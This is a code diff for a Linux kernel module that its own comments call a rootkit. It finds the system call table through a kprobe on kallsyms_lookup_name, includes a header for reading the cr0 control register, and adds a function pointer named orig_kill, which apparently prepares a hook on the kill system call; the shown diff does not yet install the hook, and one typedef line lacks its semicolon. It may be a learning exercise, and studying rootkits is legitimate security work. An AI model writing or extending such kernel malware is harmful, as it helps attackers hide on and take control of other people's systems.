@@ -7,6 +7,16 @@
 #include <linux/version.h>      // Linux kernel versions
 #include <asm/paravirt.h>       //needed to read the cr0 register
 
+//for use with later if rootkit is modified to work with earlier linux
+#define PTREGS_SYSCALL_STUB 1
+
+//syscalls start with asmlinkage
+//function pointer
+typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs)
+static ptregs_t orig_kill;
+
+
+
 //modifying kprobe. filling out name here
 static struct kprobe kp = {
     .symbol_name = "kallsyms_lookup_name"
@@ -62,7 +72,7 @@ static int __init mod_init(void)
     if (register_kprobe(&kp) < 0)
     {
         printk("Could not register kprobe\n");
-        return 0;
+        return 1;
     }
     printk(KERN_INFO "register kprobe success\n");
 
@@ -78,16 +88,19 @@ static int __init mod_init(void)
     if(!sys_call_table)
     {
         printk(KERN_INFO "Sys call table not found.. exiting");
-        mod_exit();
+        return 1;
     }
     printk(KERN_INFO "sys call table found\n");
 
-    
+
 
     return 0;
 }
 
+//tell it where to go insmod
 module_init(mod_init);
+
+//tell it where to go on rmmod
 module_exit(mod_exit);
 
 //needed for module build. removed taint dmesg message
